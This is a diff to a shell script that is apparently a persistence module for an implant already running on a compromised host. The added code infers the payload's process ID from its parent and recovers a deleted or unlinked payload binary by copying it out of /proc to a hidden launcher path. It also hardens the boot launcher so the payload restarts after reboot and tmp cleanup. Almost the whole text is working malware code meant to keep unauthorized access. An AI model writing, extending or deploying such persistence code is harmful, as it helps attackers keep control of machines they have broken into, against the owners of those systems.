@@ -42,6 +42,7 @@ COMMAND=""
 NAME="$DEFAULT_NAME"
 INTERVAL=3600
 AGENT_PID=""
+PIN_ORIG=""
 
 log()  { printf '[persist] %s\n' "$*"; }
 fail() { printf '[persist] ERROR: %s\n' "$*" >&2; exit 1; }
@@ -81,12 +82,48 @@ fi
 
 # Resolve the agent's own executable when no command was supplied. This keeps
 # persistence pointing at the payload that is already on the host.
-if [ -z "$COMMAND" ] && [ -n "$AGENT_PID" ]; then
-    if [ -e "/proc/$AGENT_PID/exe" ]; then
+if [ -z "$COMMAND" ]; then
+    if [ -z "$AGENT_PID" ]; then
+        parent_pid=$(cut -d' ' -f4 "/proc/$$/stat" 2>/dev/null)
+        case "$parent_pid" in
+            ''|*[!0-9]*) parent_pid="" ;;
+        esac
+        if [ -n "$parent_pid" ]; then
+            AGENT_PID="$parent_pid"
+            log "no --agent-pid supplied, using parent pid $AGENT_PID"
+        fi
+    fi
+
+    if [ -n "$AGENT_PID" ] && [ -e "/proc/$AGENT_PID/exe" ]; then
         COMMAND="$(readlink -f "/proc/$AGENT_PID/exe" 2>/dev/null)"
         log "resolved agent executable from pid $AGENT_PID: ${COMMAND:-unknown}"
     else
-        log "pid $AGENT_PID is gone, cannot resolve the agent executable"
+        log "pid ${AGENT_PID:-unknown} is gone, cannot resolve the agent executable"
+    fi
+fi
+
+# If the running payload was launched from a deleted file (readlink reports
+# " (deleted)"), was unlinked afterwards, or has no execute bit, pin a copy of
+# the live inode to a stable path so the launcher survives a reboot and tmp
+# cleanup instead of silently exiting at boot.
+if [ -n "$AGENT_PID" ] && [ -e "/proc/$AGENT_PID/exe" ]; then
+    pin_needed=0
+    case "$COMMAND" in
+        ""|*"(deleted)"*) pin_needed=1 ;;
+        *) [ -x "$COMMAND" ] || pin_needed=1 ;;
+    esac
+
+    if [ "$pin_needed" = "1" ]; then
+        pinned="$LAUNCHER_DIR/$NAME.bin"
+        mkdir -p "$LAUNCHER_DIR" || fail "cannot create $LAUNCHER_DIR"
+        if cp "/proc/$AGENT_PID/exe" "$pinned" 2>/dev/null; then
+            chmod 700 "$pinned" 2>/dev/null
+            log "pinned live payload to $pinned (previous: ${COMMAND:-none})"
+            PIN_ORIG="$COMMAND"
+            COMMAND="$pinned"
+        else
+            log "could not pin payload to $pinned, keeping ${COMMAND:-none}"
+        fi
     fi
 fi
 
@@ -108,9 +145,13 @@ write_launcher() {
 #!/bin/sh
 # $MARKER $NAME
 EXE="$COMMAND"
+ALT="$PIN_ORIG"
 [ -n "\$EXE" ] || exit 0
 [ -x "\$EXE" ] || exit 0
 if pgrep -f "\$EXE" >/dev/null 2>&1; then
+    exit 0
+fi
+if [ -n "\$ALT" ] && [ "\$ALT" != "\$EXE" ] && pgrep -f "\${ALT% (deleted)}" >/dev/null 2>&1; then
     exit 0
 fi
 exec "\$EXE" >/dev/null 2>&1
